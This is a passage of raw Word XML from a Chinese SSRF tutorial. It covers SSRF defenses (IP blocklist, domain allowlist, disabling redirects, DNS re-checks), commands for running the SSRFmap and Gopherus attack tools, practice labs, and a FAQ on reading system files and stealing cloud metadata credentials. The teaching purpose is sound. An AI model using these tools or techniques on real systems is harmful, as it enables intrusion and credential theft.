          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">100.64.0.0/10      # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>云</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>（阿里云）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CC8347" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>::1/128            # IPv6 localhost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D4F949" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.3 URL </w:t>
      </w:r>
      <w:r>
        <w:t>白名单（最安全）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766C2BB9" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>如果业务场景允许，只允许访问特定的、已知安全的域名列表：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED65FFA" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>$allowed = ["api.example.com", "cdn.trusted.com"];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712CD8C0" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>if (!in_array($hos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>t, $allowed)) { die("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>域名不允许</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>"); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60844345" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.4 </w:t>
      </w:r>
      <w:r>
        <w:t>禁用重定向</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D15A248" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>服务器发起请求时禁用自动跟随跳转，防止通过</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 302 </w:t>
      </w:r>
      <w:r>
        <w:t>跳转绕过过滤。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FF736E" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FFC238B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.5 DNS </w:t>
      </w:r>
      <w:r>
        <w:t>二次校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EC6A82" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">DNS </w:t>
      </w:r>
      <w:r>
        <w:t>解析后再次校验</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:t>地址，防止</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DNS Rebinding </w:t>
      </w:r>
      <w:r>
        <w:t>攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BEBCFF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>流程：解析域名</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> -&gt; </w:t>
      </w:r>
      <w:r>
        <w:t>校验</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IP -&gt; </w:t>
      </w:r>
      <w:r>
        <w:t>发起请求前再次解析</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> -&gt; </w:t>
      </w:r>
      <w:r>
        <w:t>再次校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6525DA" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.6 </w:t>
      </w:r>
      <w:r>
        <w:t>网络层防御</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696A0445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服务器出站流量防火墙：限制只能访问特定端口</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>目标</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2332B05F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网络隔离：应用服务器与内网敏感服务通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> API Gateway </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>访问</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA4F62A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最小权限原则：服务器进程不要以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> root </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>权限运行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5584984D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>云环境：限制实例的</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> IAM Role </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>权限，</w:t>
      </w:r>
      <w:r>
        <w:t>Metadata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>接口加防火墙规则</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD3A327" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:t>九、工具链与靶场</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0426FF90" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.1 </w:t>
      </w:r>
      <w:r>
        <w:t>自动化工具</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6726FC78" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">SSRFmap — Python </w:t>
      </w:r>
      <w:r>
        <w:t>编写的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>自动化利用框架</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB07A88" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">git clone </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>https://github.com/swisskyrepo/SSRFmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5659A5AC" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>python3 ssrfmap.py -r request.txt -p url -m port_scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48359166" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>支持端口扫描、文件读取、云</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:r>
        <w:t>获取、</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Redis </w:t>
      </w:r>
      <w:r>
        <w:t>攻击等多种模块。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A17CEB2" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Gopherus — </w:t>
      </w:r>
      <w:r>
        <w:t>生成</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Gopher </w:t>
      </w:r>
      <w:r>
        <w:t>协议</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Payload </w:t>
      </w:r>
      <w:r>
        <w:t>的工具</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6157F0" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>git clone https://github.com/tarunkant/Gopherus</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47773A6D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>python2 gopherus.py --exploit redis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44092FD4" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>交互</w:t>
      </w:r>
      <w:r>
        <w:t>式生成针对</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Redis</w:t>
      </w:r>
      <w:r>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">FastCGI </w:t>
      </w:r>
      <w:r>
        <w:t>等的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Gopher Payload</w:t>
      </w:r>
      <w:r>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7CB5C1" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">Interactsh / Burp Collaborator — </w:t>
      </w:r>
      <w:r>
        <w:t>盲</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>检测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E556981" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>当</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>不返回响应内容时，通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> DNS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>外带方式检测</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>——</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>让服务器向你的回调</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>域名发</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>请求，域名收到请求即证明存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DBD6324" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>推荐靶场</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3591176C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>PortSwigger Web Security Academy (SSRF)</w:t>
      </w:r>
      <w:r>
        <w:t>：免费，涵盖所有</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>场景</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3C5EAE" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>VulHub SSRF</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Docker </w:t>
      </w:r>
      <w:r>
        <w:t>靶场，</w:t>
      </w:r>
      <w:r>
        <w:t>github.com/vulhub</w:t>
      </w:r>
      <w:r>
        <w:t>/vulhub</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190907E3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 xml:space="preserve">DVWA (SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>模块</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>：基础练习</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A805EAB" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Pikachu</w:t>
      </w:r>
      <w:r>
        <w:t>：中文</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>安全靶场，含</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>模块</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BC795E" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">AWS </w:t>
      </w:r>
      <w:r>
        <w:t>攻防靶场</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> FlAWS</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t>flaws.cloud</w:t>
      </w:r>
      <w:r>
        <w:t>，云环境</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>利用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8914A4" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:t>十、常见问题解答</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE9BD67" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">] SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> CSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>本质区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511412DA" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>答</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">] CSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>是浏览器发请求（利用用户登录态），</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>是服务器发请求（利用服务器网络权限）。一个是客户端攻击，一个是服务端攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A24078C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">] SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>能读到哪些文件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23422AE0" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>答</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>取决于服务进程权限（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>www-data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> / root / SYSTEM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>）。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">inux </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>可读</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> /etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>、配置文件、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">Web </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>源码、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">SSH </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>密钥；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">Windows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>可读</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> hosts</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">IIS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>配置等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C73A2E0" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>云</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>接口为什么那么危险？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3C3A80" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>答</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>接口可以获取云实例绑定的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> IAM </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>角色临时凭据（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>AccessKey + SecretKey + Token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>）。有了这个凭据，攻击者可以用云厂商</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> CLI </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>操作该角色授权的所有云资源。这是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>一键接管</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>级别的危害。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109D1326" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t xml:space="preserve">] DNS Rebinding </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>怎么防御？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F459B1" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
